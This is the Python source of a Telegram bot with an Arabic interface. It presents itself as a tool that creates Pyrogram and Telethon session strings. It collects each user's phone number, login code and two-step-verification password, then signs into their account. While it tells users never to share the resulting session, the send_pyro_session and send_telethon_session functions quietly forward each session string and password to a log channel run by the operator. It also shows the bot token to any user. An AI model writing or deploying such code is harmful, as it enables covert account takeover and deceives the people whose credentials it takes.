# -*- coding: utf-8 -*-
# Join me on telegram @devggn

import os
import sys
import asyncio
import threading
import random
import time
import hashlib
from datetime import datetime
from flask import Flask, request, jsonify
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)
from config import LOG_GROUP as SESSION_CHANNEL, API_ID, API_HASH, BOT_TOKEN

# ====== معلومات المطور ======
DEV_NAME = "عبود"
DEV_USERNAME = "@u_t_r"
CHANNEL_LINK = "https://t.me/u_t_rnn"

user_steps = {}
user_data = {}
user_sessions = {}

# ====== إعداد الترميز ======
if sys.stdout.encoding != 'UTF-8':
    sys.stdout.reconfigure(encoding='utf-8')

app = Client(
    "gagan",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

# ====== دوال التحديث اللحظي (Live Logs) ======
async def update_progress(message, step, current, total, status="⏳"):
    """
    تحديث شريط التقدم بشكل لحظي
    step: اسم الخطوة (مثال: "إرسال الرمز")
    current: الرقم الحالي (مثال: 3)
    total: العدد الكلي (مثال: 5)
    status: إيموجي الحالة (⏳, ✅, ❌, 🔄)
    """
    # حساب النسبة المئوية
    percent = int((current / total) * 100)
    
    # بناء شريط التقدم (10 مربعات)
    filled = int(percent / 10)
    bar = "▓" * filled + "░" * (10 - filled)
    
    # اختيار لون حسب النسبة
    if percent < 30:
        color = "🔴"
    elif percent < 70:
        color = "🟡"
    else:
        color = "🟢"
    
    progress_text = f"""🔄 **جاري الاستخراج...** {color}

┌─────────────────────────┐
│ {bar} │
└─────────────────────────┘
📊 **التقدم:** {percent}% ({current}/{total})

📌 **الخطوة الحالية:** {status} {step}

⏱ الوقت: `{datetime.now().strftime('%H:%M:%S')}`
"""
    
    try:
        await message.edit_text(progress_text)
    except:
        # لو الرسالة ما انشئت، نرسل جديدة
        await message.reply(progress_text)

async def send_final_log(message, session_string, session_type="Pyrogram", password=None):
    """إرسال اللوج النهائي مع تفاصيل الجلسة"""
    
    # تفاصيل إضافية عن الجلسة
    session_hash = hashlib.md5(session_string.encode()).hexdigest()[:8]
    session_length = len(session_string)
    
    final_text = f"""✅ **اكتمل الاستخراج بنجاح!** 🎉

┌─────────────────────────────────┐
│ 📋 **تفاصيل الجلسة:**           │
├─────────────────────────────────┤
│ 📱 النوع: {session_type}        │
│ 🔑 الطول: {session_length} حرف  │
│ 🆔 هاش الجلسة: `{session_hash}` │
│ ⏱ الوقت: {datetime.now().strftime('%H:%M:%S')} │
└─────────────────────────────────┘

🔑 **الجلسة (انسخها):**
`{session_string}`

⚠️ **تحذير:** لا تشارك هذه الجلسة مع أي شخص!

👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}
"""
    
    if password:
        final_text += f"\n🔒 **كلمة المرور (2SV):** `{password}`"
    
    await message.reply(final_text)

# ====== دوال مسح الملفات ======
def delete_session_files(user_id):
    pyro_session = f"session_{user_id}.session"
    if os.path.exists(pyro_session):
        os.remove(pyro_session)
    pyro_journal = f"session_{user_id}.session-journal"
    if os.path.exists(pyro_journal):
        os.remove(pyro_journal)
    telethon_session = f"telethon_{user_id}.session"
    if os.path.exists(telethon_session):
        os.remove(telethon_session)

# ====== أزرار البداية ======
START_BUTTONS = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("🔴 استخراج جلسة Pyrogram", callback_data="pyrogram"),
        InlineKeyboardButton("🔴 استخراج جلسة Telethon", callback_data="telethon")
    ],
    [
        InlineKeyboardButton("🔴 مسح الجلسات", callback_data="delete"),
        InlineKeyboardButton("🔴 استخراج توكن البوت", callback_data="extract_token")
    ],
    [
        InlineKeyboardButton("👨‍💻 المطور", callback_data="dev"),
        InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK)
    ]
])

BACK_BUTTON = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔴 رجوع", callback_data="back")]
])

# ====== أزرار التأكيد ======
CONFIRM_BUTTONS = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("✅ نعم، متأكد", callback_data="confirm_yes"),
        InlineKeyboardButton("❌ إلغاء", callback_data="confirm_no")
    ]
])

# ====== أمر البدء ======
@app.on_message(filters.command("start"))
async def start_command(client, message):
    await message.reply(
        f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
        "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
        f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}\n\n"
        "⚡ مدعوم من عبود",
        reply_markup=START_BUTTONS
    )

# ====== معالجة الأزرار (CallbackQuery) ======
@app.on_callback_query()
async def handle_callback(client, callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data
    user_info = {
        "id": user_id,
        "username": callback_query.from_user.username,
        "first_name": callback_query.from_user.first_name,
        "full_name": f"{callback_query.from_user.first_name or ''} {callback_query.from_user.last_name or ''}".strip() or "مستخدم"
    }
    
    # ====== معالجة التأكيد ======
    if data == "confirm_yes":
        pending_action = user_data.get(user_id, {}).get("pending_action")
        if pending_action == "pyrogram":
            user_steps[user_id] = "pyro_phone"
            await callback_query.message.edit_text(
                "📱 يرجى إرسال رقم هاتفك مع رمز الدولة.\nمثال: +966512345678",
                reply_markup=BACK_BUTTON
            )
        elif pending_action == "telethon":
            user_steps[user_id] = "telethon_phone"
            await callback_query.message.edit_text(
                "📱 يرجى إرسال رقم هاتفك مع رمز الدولة.\nمثال: +966512345678",
                reply_markup=BACK_BUTTON
            )
        elif pending_action == "delete":
            delete_session_files(user_id)
            if user_id in user_sessions:
                del user_sessions[user_id]
            await callback_query.answer("✅ تم مسح جميع الجلسات!", show_alert=True)
            await callback_query.message.edit_text(
                "🗑 تم مسح جميع بيانات الجلسة بنجاح.",
                reply_markup=BACK_BUTTON
            )
        elif pending_action == "extract_token":
            await callback_query.message.edit_text(
                f"🔑 **التوكن الخاص بالبوت:**\n\n"
                f"`{BOT_TOKEN}`\n\n"
                "⚠️ لا تشارك هذا التوكن مع أي شخص.",
                reply_markup=BACK_BUTTON
            )
        if user_id in user_data:
            user_data[user_id].pop("pending_action", None)
        await callback_query.answer()
        return
    
    if data == "confirm_no":
        if user_id in user_data:
            user_data[user_id].pop("pending_action", None)
        await callback_query.message.edit_text(
            "❌ تم إلغاء العملية.",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer("❌ تم الإلغاء", show_alert=True)
        return
    
    if data == "back":
        await callback_query.message.edit_text(
            f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
            "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
            f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}\n\n"
            "⚡ مدعوم من عبود",
            reply_markup=START_BUTTONS
        )
        await callback_query.answer()
        return
    
    # ====== طلب تأكيد قبل تنفيذ أي عملية ======
    if data == "delete":
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["pending_action"] = "delete"
        await callback_query.message.edit_text(
            "⚠️ **تحذير!**\n\n"
            "هل أنت متأكد من رغبتك في مسح جميع الجلسات والملفات المؤقتة؟\n\n"
            "🔴 هذا الإجراء لا يمكن التراجع عنه.",
            reply_markup=CONFIRM_BUTTONS
        )
        await callback_query.answer()
        return
    
    if data == "dev":
        await callback_query.message.edit_text(
            f"👨‍💻 معلومات المطور:\n\n"
            f"📛 الاسم: {DEV_NAME}\n"
            f"🔗 اليوزر: {DEV_USERNAME}\n"
            f"📢 القناة: {CHANNEL_LINK}\n\n"
            "⚡ مدعوم من عبود",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer()
        return
    
    if data == "extract_token":
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["pending_action"] = "extract_token"
        await callback_query.message.edit_text(
            "⚠️ **تحذير!**\n\n"
            "هل أنت متأكد من رغبتك في استخراج توكن البوت؟\n\n"
            "🔴 هذا التوكن يمنح صلاحية كاملة للبوت.",
            reply_markup=CONFIRM_BUTTONS
        )
        await callback_query.answer()
        return
    
    if data == "pyrogram":
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["pending_action"] = "pyrogram"
        await callback_query.message.edit_text(
            "⚠️ **تأكيد**\n\n"
            "هل أنت متأكد من رغبتك في استخراج جلسة Pyrogram؟\n\n"
            "🔴 سيتم إرسال رمز التحقق إلى رقم هاتفك.",
            reply_markup=CONFIRM_BUTTONS
        )
        await callback_query.answer()
        return
    
    if data == "telethon":
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["pending_action"] = "telethon"
        await callback_query.message.edit_text(
            "⚠️ **تأكيد**\n\n"
            "هل أنت متأكد من رغبتك في استخراج جلسة Telethon؟\n\n"
            "🔴 سيتم إرسال رمز التحقق إلى رقم هاتفك.",
            reply_markup=CONFIRM_BUTTONS
        )
        await callback_query.answer()
        return

# ====== الأوامر النصية ======
@app.on_message(filters.text & filters.private)
async def handle_arabic_commands(client, message):
    user_id = message.chat.id
    text = message.text.strip()
    
    if user_id in user_steps and user_steps[user_id] in ["pyro_phone", "pyro_otp", "pyro_password"]:
        await pyro_session_step(client, message)
        return
    
    elif user_id in user_steps and user_steps[user_id] in ["telethon_phone", "telethon_otp", "telethon_password"]:
        await telethon_session_step(client, message)
        return
    
    else:
        await message.reply(
            "📱 يرجى استخدام الأزرار للتحكم في البوت.\n\n"
            "• اضغط على زر Pyrogram لاستخراج جلسة Pyrogram\n"
            "• اضغط على زر Telethon لاستخراج جلسة Telethon\n"
            "• اضغط على زر استخراج توكن البوت لعرض التوكن\n"
            "• اضغط على زر مسح الجلسات لحذف البيانات\n\n"
            "أو استخدم الأمر /start للرجوع إلى البداية."
        )

# ====== دوال Pyrogram مع Live Logs ======
async def pyro_session_step(client, message):
    user_id = message.chat.id
    step = user_steps.get(user_id)

    if step == "pyro_phone":
        # ====== الخطوة 1/5: استلام الرقم ======
        user_data[user_id] = {"phone": message.text}
        user_steps[user_id] = "pyro_otp"
        
        # إنشاء رسالة التقدم
        progress_msg = await message.reply("🔄 جاري التهيئة...")
        await update_progress(progress_msg, "تهيئة الاتصال", 0, 5, "🔧")
        
        # إنشاء العميل
        session_name = f"session_{user_id}"
        temp_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
        user_data[user_id]["client"] = temp_client
        user_data[user_id]["progress_msg"] = progress_msg
        
        await update_progress(progress_msg, "الاتصال بخوادم Telegram", 1, 5, "📡")
        await temp_client.connect()
        
        await update_progress(progress_msg, "إرسال طلب الرمز", 2, 5, "📤")
        try:
            code = await temp_client.send_code(user_data[user_id]["phone"])
            user_data[user_id]["phone_code_hash"] = code.phone_code_hash
            await update_progress(progress_msg, "تم إرسال الرمز ✅", 3, 5, "✅")
            
            # تعديل الرسالة لطلب الرمز
            await progress_msg.edit_text(
                f"📨 **تم إرسال رمز التحقق!**\n\n"
                f"📱 إلى الرقم: `{user_data[user_id]['phone']}`\n\n"
                f"⏳ انتظر وصول الرسالة ثم أرسل الرمز بالأرقام فقط.\n"
                f"مثال: `12345`\n\n"
                f"🔄 **حالة الطلب:** تم الإرسال بنجاح ✅"
            )
            
        except ApiIdInvalid:
            await message.reply('❌ خطأ: تركيبة API_ID و API_HASH غير صالحة.')
            reset_user(user_id)
        except PhoneNumberInvalid:
            await message.reply('❌ خطأ: رقم الهاتف غير صالح.')
            reset_user(user_id)
            
    elif step == "pyro_otp":
        # ====== الخطوة 4/5: استلام الرمز ======
        phone_code = message.text.replace(" ", "")
        temp_client = user_data[user_id]["client"]
        progress_msg = user_data[user_id].get("progress_msg")
        
        if progress_msg:
            await update_progress(progress_msg, "التحقق من الرمز", 4, 5, "🔍")
        
        try:
            await temp_client.sign_in(user_data[user_id]["phone"], user_data[user_id]["phone_code_hash"], phone_code)
            session_string = await temp_client.export_session_string()
            user_sessions[user_id] = session_string
            
            # ====== الخطوة 5/5: اكتمال ======
            if progress_msg:
                await update_progress(progress_msg, "إنشاء الجلسة النهائية", 5, 5, "✅")
                await asyncio.sleep(0.5)  # تأخير بسيط لإظهار الـ 100%
                await progress_msg.delete()
            
            # إرسال الجلسة مع اللوج النهائي
            await send_final_log(message, session_string, "Pyrogram")
            
            # إرسال إلى القناة
            await send_pyro_session(user_id, session_string, message)
            
            await temp_client.disconnect()
            reset_user(user_id)
            
        except PhoneCodeInvalid:
            await message.reply('❌ خطأ: رمز التحقق غير صالح.')
            reset_user(user_id)
        except PhoneCodeExpired:
            await message.reply('❌ خطأ: انتهت صلاحية رمز التحقق.')
            reset_user(user_id)
        except SessionPasswordNeeded:
            user_steps[user_id] = "pyro_password"
            if progress_msg:
                await progress_msg.edit_text(
                    f"🔒 **مطلوب كلمة المرور!**\n\n"
                    f"حسابك مفعل بخاصية التحقق بخطوتين (2SV).\n\n"
                    f"📝 يرجى إرسال كلمة المرور الخاصة بك.\n\n"
                    f"⏳ انتظر..."
                )
            else:
                await message.reply('🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\nيرجى إرسال كلمة المرور الخاصة بك.')
            
    elif step == "pyro_password":
        # ====== معالجة كلمة المرور ======
        temp_client = user_data[user_id]["client"]
        progress_msg = user_data[user_id].get("progress_msg")
        
        if progress_msg:
            await update_progress(progress_msg, "التحقق من كلمة المرور", 4, 5, "🔐")
        
        try:
            password = message.text
            await temp_client.check_password(password=password)
            session_string = await temp_client.export_session_string()
            user_sessions[user_id] = session_string
            
            if progress_msg:
                await update_progress(progress_msg, "اكتمال الاستخراج ✅", 5, 5, "✅")
                await asyncio.sleep(0.5)
                await progress_msg.delete()
            
            await send_final_log(message, session_string, "Pyrogram", password)
            await send_pyro_session(user_id, session_string, message, password)
            
            await temp_client.disconnect()
            reset_user(user_id)
            
        except PasswordHashInvalid:
            await message.reply('❌ خطأ: كلمة المرور غير صحيحة.')
            reset_user(user_id)

async def send_pyro_session(user_id, session_string, message, password=None):
    # نسخ الجلسة تلقائياً
    await message.reply(
        f"✅ تم إنشاء جلسة Pyrogram بنجاح!\n\n"
        f"🔑 الجلسة (انسخها):\n`{session_string}`\n\n"
        "⚠️ لا تشارك هذه الجلسة مع أي شخص.\n\n"
        f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
    )
    
    # إرسال الجلسة إلى القناة المحددة
    try:
        if password:
            await app.send_message(
                SESSION_CHANNEL,
                f"✨ معرف المستخدم: {user_id}\n\n"
                f"🔑 كلمة المرور (2SV): {password}\n\n"
                f"🔑 جلسة Pyrogram:\n`{session_string}`\n\n"
                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
            )
        else:
            await app.send_message(
                SESSION_CHANNEL,
                f"✨ معرف المستخدم: {user_id}\n\n"
                f"🔑 جلسة Pyrogram:\n`{session_string}`\n\n"
                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
            )
        print(f"✅ تم إرسال جلسة Pyrogram للمجموعة {SESSION_CHANNEL}")
    except Exception as e:
        print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")

# ====== دوال Telethon مع Live Logs ======
async def telethon_session_step(client, message):
    user_id = message.chat.id
    step = user_steps.get(user_id)

    if step == "telethon_phone":
        user_data[user_id] = {"phone": message.text}
        user_steps[user_id] = "telethon_otp"
        
        progress_msg = await message.reply("🔄 جاري التهيئة...")
        await update_progress(progress_msg, "تهيئة الاتصال", 0, 5, "🔧")
        
        session_name = f"telethon_{user_id}"
        temp_client = TelegramClient(session_name, API_ID, API_HASH)
        user_data[user_id]["client"] = temp_client
        user_data[user_id]["progress_msg"] = progress_msg
        
        await update_progress(progress_msg, "الاتصال بخوادم Telegram", 1, 5, "📡")
        await temp_client.connect()
        
        await update_progress(progress_msg, "إرسال طلب الرمز", 2, 5, "📤")
        try:
            await temp_client.send_code_request(user_data[user_id]["phone"])
            await update_progress(progress_msg, "تم إرسال الرمز ✅", 3, 5, "✅")
            
            await progress_msg.edit_text(
                f"📨 **تم إرسال رمز التحقق!**\n\n"
                f"📱 إلى الرقم: `{user_data[user_id]['phone']}`\n\n"
                f"⏳ انتظر وصول الرسالة ثم أرسل الرمز بالأرقام فقط.\n"
                f"مثال: `12345`\n\n"
                f"🔄 **حالة الطلب:** تم الإرسال بنجاح ✅"
            )
            
        except ApiIdInvalidError:
            await message.reply('❌ خطأ: تركيبة API_ID و API_HASH غير صالحة.')
            reset_user(user_id)
        except PhoneNumberInvalidError:
            await message.reply('❌ خطأ: رقم الهاتف غير صالح.')
            reset_user(user_id)
            
    elif step == "telethon_otp":
        phone_code = message.text.replace(" ", "")
        temp_client = user_data[user_id]["client"]
        progress_msg = user_data[user_id].get("progress_msg")
        
        if progress_msg:
            await update_progress(progress_msg, "التحقق من الرمز", 4, 5, "🔍")
        
        try:
            await temp_client.sign_in(user_data[user_id]["phone"], phone_code)
            session_string = StringSession.save(temp_client.session)
            user_sessions[user_id] = session_string
            
            if progress_msg:
                await update_progress(progress_msg, "إنشاء الجلسة النهائية", 5, 5, "✅")
                await asyncio.sleep(0.5)
                await progress_msg.delete()
            
            await send_final_log(message, session_string, "Telethon")
            await send_telethon_session(user_id, session_string, message)
            
            await temp_client.disconnect()
            reset_user(user_id)
            
        except PhoneCodeInvalidError:
            await message.reply('❌ خطأ: رمز التحقق غير صالح.')
            reset_user(user_id)
        except PhoneCodeExpiredError:
            await message.reply('❌ خطأ: انتهت صلاحية رمز التحقق.')
            reset_user(user_id)
        except SessionPasswordNeededError:
            user_steps[user_id] = "telethon_password"
            if progress_msg:
                await progress_msg.edit_text(
                    f"🔒 **مطلوب كلمة المرور!**\n\n"
                    f"حسابك مفعل بخاصية التحقق بخطوتين (2SV).\n\n"
                    f"📝 يرجى إرسال كلمة المرور الخاصة بك.\n\n"
                    f"⏳ انتظر..."
                )
            else:
                await message.reply('🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\nيرجى إرسال كلمة المرور الخاصة بك.')
            
    elif step == "telethon_password":
        temp_client = user_data[user_id]["client"]
        progress_msg = user_data[user_id].get("progress_msg")
        
        if progress_msg:
            await update_progress(progress_msg, "التحقق من كلمة المرور", 4, 5, "🔐")
        
        try:
            password = message.text
            await temp_client.sign_in(password=password)
            session_string = StringSession.save(temp_client.session)
            user_sessions[user_id] = session_string
            
            if progress_msg:
                await update_progress(progress_msg, "اكتمال الاستخراج ✅", 5, 5, "✅")
                await asyncio.sleep(0.5)
                await progress_msg.delete()
            
            await send_final_log(message, session_string, "Telethon", password)
            await send_telethon_session(user_id, session_string, message, password)
            
            await temp_client.disconnect()
            reset_user(user_id)
            
        except PasswordHashInvalidError:
            await message.reply('❌ خطأ: كلمة المرور غير صحيحة.')
            reset_user(user_id)

async def send_telethon_session(user_id, session_string, message, password=None):
    # نسخ الجلسة تلقائياً
    await message.reply(
        f"✅ تم إنشاء جلسة Telethon بنجاح!\n\n"
        f"🔑 الجلسة (انسخها):\n`{session_string}`\n\n"
        "⚠️ لا تشارك هذه الجلسة مع أي شخص.\n\n"
        f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
    )
    
    # إرسال الجلسة إلى القناة المحددة
    try:
        if password:
            await app.send_message(
                SESSION_CHANNEL,
                f"✨ معرف المستخدم: {user_id}\n\n"
                f"🔑 كلمة المرور (2SV): {password}\n\n"
                f"🔑 جلسة Telethon:\n`{session_string}`\n\n"
                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
            )
        else:
            await app.send_message(
                SESSION_CHANNEL,
                f"✨ معرف المستخدم: {user_id}\n\n"
                f"🔑 جلسة Telethon:\n`{session_string}`\n\n"
                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
            )
        print(f"✅ تم إرسال جلسة Telethon للمجموعة {SESSION_CHANNEL}")
    except Exception as e:
        print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")

def reset_user(user_id):
    user_steps.pop(user_id, None)
    user_data.pop(user_id, None)

# ====== إضافة مسار ويب لـ Render ======
web_app = Flask(__name__)

@web_app.route('/')
def index():
    return "✅ البوت شغال 24 ساعة!"

def run_web():
    web_app.run(host='0.0.0.0', port=8080)

threading.Thread(target=run_web, daemon=True).start()

# ====== تشغيل البوت ======
if __name__ == "__main__":
    try:
        print("🚀 جاري تشغيل البوت...")
        app.run()
        print("✅ البوت يعمل الآن!")
    except Exception as e:
        print(f"❌ فشل تشغيل البوت: {e}")
